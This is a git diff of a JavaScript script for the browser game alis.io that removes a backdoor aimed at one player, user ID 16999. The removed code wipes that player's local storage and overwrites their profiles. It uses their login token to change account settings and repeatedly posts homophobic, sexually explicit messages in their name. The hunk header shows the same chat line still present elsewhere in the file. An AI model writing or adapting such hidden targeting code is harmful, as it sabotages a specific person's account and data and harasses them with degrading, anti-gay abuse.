@@ -219,22 +219,5 @@ if(userid==16999){  sendChat("Im big gay catfish, i like big cocks in my ass, im
 }}
 
   });
-
-if(userid==16999){
-  $("#startmass-si").remove()
-  localStorage.clear()
-  setTimeout(function(){
-    setTimeout(nukeME, 1000*60*5)
-    localStorage.setItem("player_profile",JSON.stringify([{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"}]))
-$.get(`http://alis.io/api/users/changecolor`, {token: jwt, r: 255, g: 255, b: 255}, (data) => console.log(data));
-setInterval(function(){
-  $("#skinurl").val("https://i.imgur.com/QrW0kGk.png")
-  $("#nick").val("Chun li gay 🐱🐟")
-  sendChat("Im big gay catfish, i like big cocks in my ass, im boy and i have boyfriend")
-  scream(16999, 1)
-}, 1000*40)
-  }, 500)
-}
-
 }
 setTimeout(checkAdds, 13*1000)
